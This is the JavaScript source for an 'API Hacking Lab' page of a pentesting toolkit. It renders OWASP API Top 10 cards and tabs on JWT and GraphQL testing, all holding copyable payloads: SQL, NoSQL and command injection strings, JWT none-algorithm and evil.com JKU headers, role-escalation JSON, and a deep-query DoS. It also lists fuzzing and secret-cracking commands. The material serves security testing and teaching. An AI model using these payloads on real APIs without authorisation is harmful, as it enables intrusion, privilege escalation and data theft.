/* ==================== API HACKING LAB 🔌⚡ ==================== */
/* API Security Testing, Endpoint Discovery & Exploitation */

window.APIHackLab = {
    // --- STATE ---
    currentTab: 'endpoints',
    targetUrl: '',

    // --- API VULNERABILITIES ---
    vulnerabilities: [
        {
            name: 'Broken Object Level Authorization (BOLA)',
            id: 'API1',
            desc: 'Access other users\' data by changing IDs',
            payloads: [
                { name: 'IDOR via ID', payload: '/api/users/{other_user_id}', method: 'GET' },
                { name: 'IDOR via UUID', payload: '/api/orders/{other_uuid}', method: 'GET' },
                { name: 'Parameter Pollution', payload: '/api/users?id=1&id=2', method: 'GET' }
            ],
            testing: ['Change user IDs in requests', 'Try accessing other users\' resources', 'Test UUID guessing/prediction']
        },
        {
            name: 'Broken Authentication',
            id: 'API2',
            desc: 'Authentication mechanism flaws',
            payloads: [
                { name: 'No Auth Header', payload: 'Remove Authorization header', method: 'GET' },
                { name: 'JWT None Algorithm', payload: '{"alg":"none","typ":"JWT"}', method: 'Header' },
                { name: 'Weak Token', payload: 'Authorization: Bearer admin', method: 'Header' }
            ],
            testing: ['Test endpoints without authentication', 'Check JWT validation', 'Try password reset flaws']
        },
        {
            name: 'Excessive Data Exposure',
            id: 'API3',
            desc: 'API returns more data than needed',
            payloads: [
                { name: 'Check Response', payload: 'Look for sensitive fields in response', method: 'GET' },
                { name: 'GraphQL Introspection', payload: '{__schema{types{name,fields{name}}}}', method: 'POST' }
            ],
            testing: ['Analyze full API responses', 'Check for hidden fields', 'Use debug parameters']
        },
        {
            name: 'Lack of Resources & Rate Limiting',
            id: 'API4',
            desc: 'No protection against excessive requests',
            payloads: [
                { name: 'Brute Force', payload: 'for i in {1..1000}; do curl -X POST...', method: 'POST' },
                { name: 'OTP Bypass', payload: 'Iterate all OTP combinations', method: 'POST' }
            ],
            testing: ['Test rate limiting on login', 'Check OTP brute force', 'Test file upload limits']
        },
        {
            name: 'Broken Function Level Authorization',
            id: 'API5',
            desc: 'Access admin functions as regular user',
            payloads: [
                { name: 'Admin Endpoint', payload: '/api/admin/users', method: 'GET' },
                { name: 'Method Swap', payload: 'Change GET to PUT/DELETE', method: 'PUT' },
                { name: 'Role Escalation', payload: '{"role":"admin"}', method: 'PATCH' }
            ],
            testing: ['Access admin-only endpoints', 'Try different HTTP methods', 'Modify user roles']
        },
        {
            name: 'Mass Assignment',
            id: 'API6',
            desc: 'Modify restricted fields via binding',
            payloads: [
                { name: 'Add Admin Field', payload: '{"name":"test","isAdmin":true}', method: 'POST' },
                { name: 'Modify Balance', payload: '{"balance":9999999}', method: 'PATCH' },
                { name: 'Change Role', payload: '{"role":"admin","verified":true}', method: 'PUT' }
            ],
            testing: ['Add unexpected fields to requests', 'Try modifying restricted properties', 'Test role/privilege fields']
        },
        {
            name: 'Security Misconfiguration',
            id: 'API7',
            desc: 'Insecure default configurations',
            payloads: [
                { name: 'CORS Check', payload: 'Origin: https://evil.com', method: 'Header' },
                { name: 'Debug Mode', payload: '?debug=true&verbose=1', method: 'GET' },
                { name: 'Stack Trace', payload: 'Cause errors to see stack traces', method: 'GET' }
            ],
            testing: ['Check CORS headers', 'Look for debug endpoints', 'Test error handling']
        },
        {
            name: 'Injection',
            id: 'API8',
            desc: 'SQL, NoSQL, Command injection in APIs',
            payloads: [
                { name: 'SQL in JSON', payload: '{"search":"test\' OR 1=1--"}', method: 'POST' },
                { name: 'NoSQL Injection', payload: '{"user":{"$gt":""},"pass":{"$gt":""}}', method: 'POST' },
                { name: 'Command Injection', payload: '{"file":"test;id;"}', method: 'POST' }
            ],
            testing: ['Test all input parameters', 'Check for error messages', 'Try different encodings']
        }
    ],

    // --- ENDPOINT DISCOVERY ---
    discoveryTools: [
        { name: 'Swagger/OpenAPI', cmd: '/swagger.json, /openapi.json, /api-docs', desc: 'API documentation endpoints' },
        { name: 'Common Paths', cmd: '/api/v1, /api/v2, /rest, /graphql', desc: 'Standard API paths' },
        { name: 'FFUF API Fuzz', cmd: "ffuf -u https://target.com/api/FUZZ -w api-wordlist.txt", desc: 'Fuzz API endpoints' },
        { name: 'Kiterunner', cmd: 'kr scan https://target.com -w routes.kite', desc: 'Smart API discovery' },
        { name: 'Arjun', cmd: 'arjun -u https://target.com/api/search', desc: 'Parameter discovery' },
        { name: 'ParamSpider', cmd: 'python3 paramspider.py -d target.com', desc: 'Crawl for parameters' }
    ],

    // --- WORDLISTS ---
    wordlists: [
        { name: 'API Endpoints', path: '/usr/share/wordlists/api/endpoints.txt', desc: 'Common API paths' },
        { name: 'API Parameters', path: '/usr/share/wordlists/api/params.txt', desc: 'Parameter names' },
        { name: 'Kiterunner Routes', path: '~/.kiterunner/routes.kite', desc: 'Smart API routes' },
        { name: 'SecLists API', path: '/usr/share/seclists/Discovery/Web-Content/api/', desc: 'SecLists API discovery' }
    ],

    // --- TOOLS ---
    tools: [
        { name: 'Burp Suite', desc: 'Intercept & modify API requests', icon: 'fa-bug' },
        { name: 'Postman', desc: 'API testing & documentation', icon: 'fa-paper-plane' },
        { name: 'Insomnia', desc: 'REST & GraphQL client', icon: 'fa-moon' },
        { name: 'OWASP ZAP', desc: 'Automated API scanning', icon: 'fa-shield-alt' },
        { name: 'jwt_tool', desc: 'JWT token testing', icon: 'fa-key' },
        { name: 'GraphQL Voyager', desc: 'GraphQL schema visualization', icon: 'fa-project-diagram' }
    ],

    // --- RENDER ---
    render() {
        return `
            <div class="api-app fade-in">
                <div class="api-header">
                    <h1><i class="fas fa-plug"></i> API Hacking Lab</h1>
                    <p class="subtitle">API Security Testing & Exploitation</p>
                </div>

                <div class="api-tabs">
                    <div class="tab ${this.currentTab === 'endpoints' ? 'active' : ''}" onclick="APIHackLab.switchTab('endpoints')">
                        <i class="fas fa-search"></i> Discovery
                    </div>
                    <div class="tab ${this.currentTab === 'vulns' ? 'active' : ''}" onclick="APIHackLab.switchTab('vulns')">
                        <i class="fas fa-bug"></i> OWASP API Top 10
                    </div>
                    <div class="tab ${this.currentTab === 'jwt' ? 'active' : ''}" onclick="APIHackLab.switchTab('jwt')">
                        <i class="fas fa-key"></i> JWT Testing
                    </div>
                    <div class="tab ${this.currentTab === 'graphql' ? 'active' : ''}" onclick="APIHackLab.switchTab('graphql')">
                        <i class="fas fa-project-diagram"></i> GraphQL
                    </div>
                </div>

                <div class="api-content">
                    ${this.renderTabContent()}
                </div>
            </div>
            ${this.getStyles()}
        `;
    },

    renderTabContent() {
        switch (this.currentTab) {
            case 'endpoints': return this.renderEndpoints();
            case 'vulns': return this.renderVulns();
            case 'jwt': return this.renderJWT();
            case 'graphql': return this.renderGraphQL();
            default: return '';
        }
    },

    renderEndpoints() {
        return `
            <div class="endpoints-section">
                <h2><i class="fas fa-search"></i> API Endpoint Discovery</h2>
                
                <div class="discovery-grid">
                    ${this.discoveryTools.map(t => `
                        <div class="discovery-card">
                            <h4>${t.name}</h4>
                            <p>${t.desc}</p>
                            <div class="cmd-box">
                                <code>${t.cmd}</code>
                                <button onclick="navigator.clipboard.writeText('${t.cmd}')"><i class="fas fa-copy"></i></button>
                            </div>
                        </div>
                    `).join('')}
                </div>

                <div class="common-endpoints">
                    <h3><i class="fas fa-list"></i> Common API Endpoints to Check</h3>
                    <div class="endpoints-list">
                        <div class="endpoint-item"><code>/api/v1/users</code><span>User enumeration</span></div>
                        <div class="endpoint-item"><code>/api/v1/admin</code><span>Admin functions</span></div>
                        <div class="endpoint-item"><code>/swagger.json</code><span>API docs</span></div>
                        <div class="endpoint-item"><code>/graphql</code><span>GraphQL endpoint</span></div>
                        <div class="endpoint-item"><code>/api/debug</code><span>Debug info</span></div>
                        <div class="endpoint-item"><code>/api/health</code><span>Status info</span></div>
                        <div class="endpoint-item"><code>/.well-known/</code><span>Well-known URIs</span></div>
                        <div class="endpoint-item"><code>/api/v1/config</code><span>Configuration</span></div>
                    </div>
                </div>

                <div class="tools-section">
                    <h3><i class="fas fa-toolbox"></i> Recommended Tools</h3>
                    <div class="tools-grid">
                        ${this.tools.map(t => `
                            <div class="tool-badge"><i class="fas ${t.icon}"></i> ${t.name}</div>
                        `).join('')}
                    </div>
                </div>
            </div>
        `;
    },

    renderVulns() {
        return `
            <div class="vulns-section">
                <h2><i class="fas fa-bug"></i> OWASP API Security Top 10</h2>
                <div class="vulns-grid">
                    ${this.vulnerabilities.map(v => `
                        <div class="vuln-card">
                            <div class="vuln-header">
                                <span class="vuln-id">${v.id}</span>
                                <h4>${v.name}</h4>
                            </div>
                            <p>${v.desc}</p>
                            <div class="vuln-payloads">
                                <h5>Payloads:</h5>
                                ${v.payloads.map(p => `
                                    <div class="payload-row">
                                        <span class="method">${p.method}</span>
                                        <code>${p.payload}</code>
                                        <button onclick="navigator.clipboard.writeText(\`${p.payload}\`)"><i class="fas fa-copy"></i></button>
                                    </div>
                                `).join('')}
                            </div>
                            <div class="vuln-testing">
                                <h5>Testing Checklist:</h5>
                                <ul>${v.testing.map(t => `<li>${t}</li>`).join('')}</ul>
                            </div>
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
    },

    renderJWT() {
        return `
            <div class="jwt-section">
                <h2><i class="fas fa-key"></i> JWT Token Testing</h2>
                
                <div class="jwt-decoder">
                    <h3>JWT Decoder</h3>
                    <textarea id="jwt-input" placeholder="Paste JWT token here..."></textarea>
                    <button onclick="APIHackLab.decodeJWT()"><i class="fas fa-unlock"></i> Decode</button>
                    <div id="jwt-output" class="jwt-output"></div>
                </div>

                <div class="jwt-attacks">
                    <h3><i class="fas fa-skull-crossbones"></i> Common JWT Attacks</h3>
                    <div class="attacks-grid">
                        <div class="attack-card">
                            <h4>None Algorithm</h4>
                            <p>Change alg to "none" and remove signature</p>
                            <code>{"alg":"none","typ":"JWT"}</code>
                        </div>
                        <div class="attack-card">
                            <h4>Algorithm Confusion</h4>
                            <p>Change RS256 to HS256, use public key as secret</p>
                            <code>{"alg":"HS256"} + sign with public key</code>
                        </div>
                        <div class="attack-card">
                            <h4>Weak Secret</h4>
                            <p>Brute force weak HMAC secrets</p>
                            <code>hashcat -m 16500 jwt.txt wordlist.txt</code>
                        </div>
                        <div class="attack-card">
                            <h4>Kid Injection</h4>
                            <p>SQL injection in kid parameter</p>
                            <code>{"kid":"' UNION SELECT 'secret'--"}</code>
                        </div>
                        <div class="attack-card">
                            <h4>JKU/X5U Injection</h4>
                            <p>Point to attacker-controlled key server</p>
                            <code>{"jku":"https://evil.com/jwks.json"}</code>
                        </div>
                        <div class="attack-card">
                            <h4>Expiration Bypass</h4>
                            <p>Remove or modify exp claim</p>
                            <code>{"exp":9999999999}</code>
                        </div>
                    </div>
                </div>

                <div class="jwt-tools">
                    <h3><i class="fas fa-terminal"></i> JWT Tools Commands</h3>
                    <div class="cmd-list">
                        <div class="cmd-item">
                            <span>jwt_tool</span>
                            <code>python3 jwt_tool.py &lt;JWT&gt; -T</code>
                        </div>
                        <div class="cmd-item">
                            <span>Crack Secret</span>
                            <code>python3 jwt_tool.py &lt;JWT&gt; -C -d wordlist.txt</code>
                        </div>
                        <div class="cmd-item">
                            <span>None Attack</span>
                            <code>python3 jwt_tool.py &lt;JWT&gt; -X a</code>
                        </div>
                    </div>
                </div>
            </div>
        `;
    },

    renderGraphQL() {
        return `
            <div class="graphql-section">
                <h2><i class="fas fa-project-diagram"></i> GraphQL Security Testing</h2>
                
                <div class="graphql-queries">
                    <h3><i class="fas fa-search"></i> Introspection Queries</h3>
                    <div class="query-cards">
                        <div class="query-card">
                            <h4>Full Schema</h4>
                            <code>{__schema{types{name,fields{name,args{name}}}}}</code>
                            <button onclick="navigator.clipboard.writeText('{__schema{types{name,fields{name,args{name}}}}}')"><i class="fas fa-copy"></i></button>
                        </div>
                        <div class="query-card">
                            <h4>All Types</h4>
                            <code>{__schema{types{name}}}</code>
                            <button onclick="navigator.clipboard.writeText('{__schema{types{name}}}')"><i class="fas fa-copy"></i></button>
                        </div>
                        <div class="query-card">
                            <h4>Query Type</h4>
                            <code>{__schema{queryType{name,fields{name}}}}</code>
                            <button onclick="navigator.clipboard.writeText('{__schema{queryType{name,fields{name}}}}')"><i class="fas fa-copy"></i></button>
                        </div>
                        <div class="query-card">
                            <h4>Mutation Type</h4>
                            <code>{__schema{mutationType{name,fields{name}}}}</code>
                            <button onclick="navigator.clipboard.writeText('{__schema{mutationType{name,fields{name}}}}')"><i class="fas fa-copy"></i></button>
                        </div>
                    </div>
                </div>

                <div class="graphql-attacks">
                    <h3><i class="fas fa-skull-crossbones"></i> GraphQL Attacks</h3>
                    <div class="attacks-list">
                        <div class="attack-row">
                            <span class="attack-name">DoS via Deep Query</span>
                            <code>{user{friends{friends{friends{friends{name}}}}}}</code>
                        </div>
                        <div class="attack-row">
                            <span class="attack-name">Batch Query Attack</span>
                            <code>[{query:"..."},{query:"..."},{query:"..."}]</code>
                        </div>
                        <div class="attack-row">
                            <span class="attack-name">Field Suggestion</span>
                            <code>{user{passwor}} // Check error for suggestions</code>
                        </div>
                        <div class="attack-row">
                            <span class="attack-name">IDOR via ID</span>
                            <code>{user(id:1){email,password}}</code>
                        </div>
                    </div>
                </div>

                <div class="graphql-tools">
                    <h3><i class="fas fa-toolbox"></i> GraphQL Tools</h3>
                    <div class="tools-badges">
                        <span class="tool-badge"><i class="fas fa-globe"></i> GraphQL Voyager</span>
                        <span class="tool-badge"><i class="fas fa-map"></i> GraphQL Map</span>
                        <span class="tool-badge"><i class="fas fa-spider"></i> InQL (Burp)</span>
                        <span class="tool-badge"><i class="fas fa-terminal"></i> graphql-cop</span>
                    </div>
                </div>
            </div>
        `;
    },

    // --- ACTIONS ---
    switchTab(tab) {
        this.currentTab = tab;
        this.reRender();
    },

    decodeJWT() {
        const jwt = document.getElementById('jwt-input').value.trim();
        const output = document.getElementById('jwt-output');

        if (!jwt) {
            output.innerHTML = '<p class="error">Please enter a JWT token</p>';
            return;
        }

        try {
            const parts = jwt.split('.');
            if (parts.length !== 3) throw new Error('Invalid JWT format');

            const header = JSON.parse(atob(parts[0]));
            const payload = JSON.parse(atob(parts[1]));

            output.innerHTML = `
                <div class="jwt-part">
                    <h4>Header</h4>
                    <pre>${JSON.stringify(header, null, 2)}</pre>
                </div>
                <div class="jwt-part">
                    <h4>Payload</h4>
                    <pre>${JSON.stringify(payload, null, 2)}</pre>
                </div>
                <div class="jwt-part">
                    <h4>Signature</h4>
                    <code>${parts[2]}</code>
                </div>
            `;
        } catch (e) {
            output.innerHTML = `<p class="error">Error decoding: ${e.message}</p>`;
        }
    },

    reRender() {
        const app = document.querySelector('.api-app');
        if (app) app.outerHTML = this.render();
    },

    getStyles() {
        return `<style>
            .api-app { min-height: calc(100vh - 60px); background: linear-gradient(135deg, #0a0a12 0%, #1a1a2e 100%); color: #e0e0e0; padding: 25px; font-family: 'Segoe UI', sans-serif; }
            .api-header h1 { margin: 0; color: #a855f7; font-size: 1.8rem; }
            .api-header .subtitle { color: #888; margin: 5px 0 20px; }

            .api-tabs { display: flex; gap: 5px; margin-bottom: 20px; }
            .tab { padding: 10px 18px; border-radius: 8px; cursor: pointer; transition: 0.2s; color: #888; display: flex; align-items: center; gap: 8px; }
            .tab:hover { color: #fff; background: rgba(255,255,255,0.05); }
            .tab.active { background: #a855f7; color: #fff; }

            .discovery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; margin-bottom: 25px; }
            .discovery-card { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 12px; }
            .discovery-card h4 { color: #a855f7; margin: 0 0 8px; }
            .discovery-card p { color: #888; margin: 0 0 12px; font-size: 0.9rem; }
            .cmd-box { display: flex; align-items: center; gap: 10px; background: #0a0a12; padding: 10px; border-radius: 8px; }
            .cmd-box code { flex: 1; color: #2ecc71; font-size: 0.85rem; }
            .cmd-box button { background: none; border: none; color: #666; cursor: pointer; }

            .common-endpoints { margin-bottom: 25px; }
            .common-endpoints h3 { color: #a855f7; margin: 0 0 15px; }
            .endpoints-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 10px; }
            .endpoint-item { display: flex; justify-content: space-between; background: rgba(0,0,0,0.3); padding: 12px; border-radius: 8px; }
            .endpoint-item code { color: #f39c12; }
            .endpoint-item span { color: #666; font-size: 0.85rem; }

            .tools-grid { display: flex; flex-wrap: wrap; gap: 10px; }
            .tool-badge { background: rgba(168,85,247,0.2); color: #a855f7; padding: 8px 15px; border-radius: 20px; font-size: 0.9rem; }

            .vulns-section h2 { color: #a855f7; margin: 0 0 20px; }
            .vulns-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(400px, 1fr)); gap: 20px; }
            .vuln-card { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 15px; }
            .vuln-header { display: flex; align-items: center; gap: 12px; margin-bottom: 10px; }
            .vuln-id { background: #e74c3c; color: #fff; padding: 4px 10px; border-radius: 5px; font-weight: bold; font-size: 0.8rem; }
            .vuln-header h4 { margin: 0; color: #fff; }
            .vuln-card > p { color: #888; margin: 0 0 15px; }
            .vuln-payloads h5, .vuln-testing h5 { color: #a855f7; margin: 0 0 10px; font-size: 0.9rem; }
            .payload-row { display: flex; align-items: center; gap: 10px; background: #0a0a12; padding: 8px 12px; border-radius: 6px; margin-bottom: 8px; }
            .payload-row .method { background: #f39c12; color: #000; padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold; }
            .payload-row code { flex: 1; color: #2ecc71; font-size: 0.8rem; }
            .payload-row button { background: none; border: none; color: #666; cursor: pointer; }
            .vuln-testing ul { margin: 0; padding-left: 20px; color: #888; }
            .vuln-testing li { margin: 5px 0; font-size: 0.9rem; }

            .jwt-section h2 { color: #a855f7; margin: 0 0 20px; }
            .jwt-decoder { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 15px; margin-bottom: 25px; }
            .jwt-decoder h3 { color: #a855f7; margin: 0 0 15px; }
            .jwt-decoder textarea { width: 100%; height: 80px; background: #0a0a12; border: 1px solid #333; border-radius: 8px; padding: 12px; color: #2ecc71; font-family: monospace; margin-bottom: 10px; }
            .jwt-decoder button { padding: 10px 20px; background: #a855f7; border: none; border-radius: 8px; color: #fff; cursor: pointer; }
            .jwt-output { margin-top: 15px; }
            .jwt-part { background: #0a0a12; padding: 15px; border-radius: 8px; margin-bottom: 10px; }
            .jwt-part h4 { color: #a855f7; margin: 0 0 10px; }
            .jwt-part pre { margin: 0; color: #2ecc71; font-size: 0.85rem; }
            .jwt-part code { color: #f39c12; word-break: break-all; }
            .error { color: #e74c3c; }

            .jwt-attacks, .graphql-attacks { margin-bottom: 25px; }
            .jwt-attacks h3, .graphql-attacks h3 { color: #a855f7; margin: 0 0 15px; }
            .attacks-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
            .attack-card { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 12px; }
            .attack-card h4 { color: #e74c3c; margin: 0 0 8px; }
            .attack-card p { color: #888; margin: 0 0 10px; font-size: 0.85rem; }
            .attack-card code { display: block; background: #0a0a12; padding: 10px; border-radius: 6px; color: #2ecc71; font-size: 0.8rem; }

            .jwt-tools h3 { color: #a855f7; margin: 0 0 15px; }
            .cmd-list { display: flex; flex-direction: column; gap: 10px; }
            .cmd-item { display: flex; align-items: center; gap: 15px; background: rgba(0,0,0,0.3); padding: 12px 15px; border-radius: 8px; }
            .cmd-item span { color: #a855f7; min-width: 120px; }
            .cmd-item code { color: #2ecc71; }

            .graphql-queries { margin-bottom: 25px; }
            .graphql-queries h3 { color: #a855f7; margin: 0 0 15px; }
            .query-cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
            .query-card { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 12px; }
            .query-card h4 { color: #fff; margin: 0 0 10px; }
            .query-card code { display: block; background: #0a0a12; padding: 10px; border-radius: 6px; color: #2ecc71; font-size: 0.8rem; margin-bottom: 10px; word-break: break-all; }
            .query-card button { background: #a855f7; border: none; padding: 6px 12px; border-radius: 5px; color: #fff; cursor: pointer; font-size: 0.8rem; }

            .attacks-list { display: flex; flex-direction: column; gap: 10px; }
            .attack-row { display: flex; align-items: center; gap: 15px; background: rgba(0,0,0,0.3); padding: 12px 15px; border-radius: 8px; }
            .attack-name { color: #e74c3c; min-width: 180px; }
            .attack-row code { color: #2ecc71; font-size: 0.85rem; }

            .tools-badges { display: flex; flex-wrap: wrap; gap: 10px; }

            @media (max-width: 800px) { .vulns-grid, .attacks-grid { grid-template-columns: 1fr; } }
        </style>`;
    }
};

function pageAPIHackLab() {
    return APIHackLab.render();
}
